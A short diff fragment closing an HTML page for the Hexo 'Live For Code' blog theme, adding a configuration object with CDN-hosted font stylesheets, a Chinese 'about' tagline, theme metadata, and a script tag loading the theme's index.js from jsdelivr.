+            NotoSansSC : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/NotoSansSC.css',
+            Playball   : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Playball.css',
+            PTMono     : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/PTMono.css',
+            RobotoSlab : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/RobotoSlab.css',
+            Rosario    : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/Rosario.css',
+            UbuntuMono : 'https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/font/UbuntuMono.css'
+        },
+
+        Suffix : {
+            about : '爱意东升西落，浪漫至死不渝'
+        },
+            
+        Theme : {
+            url  : 'https://github.com/first19326/Hexo-LiveForCode',
+            name : 'Hexo - Live For Code'
+        }  
+    };
+</script>
+    <script type="text/javascript" src="https://cdn.jsdelivr.net/gh/first19326/cdn@master/static/js/index.js"></script>
+</body>
+</html>
